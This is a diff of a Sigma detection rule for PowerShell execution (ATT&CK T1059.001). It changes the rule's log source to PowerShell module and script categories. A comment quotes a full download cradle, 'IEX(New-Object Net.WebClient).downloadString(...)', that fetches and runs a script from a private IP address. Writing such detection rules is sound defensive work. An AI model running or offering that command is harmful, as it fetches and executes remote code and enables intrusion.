@@ -9,7 +9,10 @@ tags:
 - attack.t1059.001
 logsource:
   product: windows
-  service: powershell
+  category:
+    - ps_module
+    - ps_classic_script
+    - ps_script
 detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
   selection_powershell_native:
     EventID: 800
